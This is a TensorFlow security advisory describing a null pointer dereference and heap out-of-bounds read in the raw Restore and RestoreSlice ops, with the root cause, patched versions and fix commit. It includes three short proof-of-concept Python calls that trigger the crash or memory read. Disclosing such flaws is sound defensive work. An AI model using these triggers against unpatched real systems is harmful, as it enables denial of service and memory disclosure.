# Null pointer dereference and heap OOB read in operations restoring tensors

Low

[mihaimaruseac](/mihaimaruseac)
published
GHSA-gh6x-4whr-2qv4
Aug 11, 2021

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.6.0

## Patched versions

2.3.4, 2.4.3,2.5.1

## Description

### Impact

When restoring tensors via raw APIs, if the tensor name is not provided, TensorFlow can be tricked into dereferencing a null pointer:

```
import tensorflow as tf

tf.raw_ops.Restore(
  file_pattern=['/tmp'],
  tensor_name=[],
  default_value=21,
  dt=tf.int,
  preferred_shard=1)
```

The same undefined behavior can be triggered by `tf.raw_ops.RestoreSlice`:

```
import tensorflow as tf

tf.raw_ops.RestoreSlice(
  file_pattern=['/tmp'],
  tensor_name=[],
  shape_and_slice='2',
  dt=inp.array([tf.int]),
  preferred_shard=1)
```

Alternatively, attackers can read memory outside the bounds of heap allocated data by providing some tensor names but not enough for a successful restoration:

```
import tensorflow as tf

tf.raw_ops.Restore(
  file_pattern=['/tmp'],
  tensor_name=['x'],
  default_value=21,
  dt=tf.int,
  preferred_shard=42)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/47a06f40411a69c99f381495f490536972152ac0/tensorflow/core/kernels/save_restore_tensor.cc#L158-L159) retrieves the tensor list corresponding to the `tensor_name` user controlled input and immediately retrieves the tensor at the restoration index (controlled via `preferred_shard` argument). This occurs without validating that the provided list has enough values.

If the list is empty this results in dereferencing a null pointer (undefined behavior). If, however, the list has some elements, if the restoration index is outside the bounds this results in heap OOB read.

### Patches

We have patched the issue in GitHub commit [9e82dce6e6bd1f36a57e08fa85af213e2b2f2622](https://github.com/tensorflow/tensorflow/commit/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.
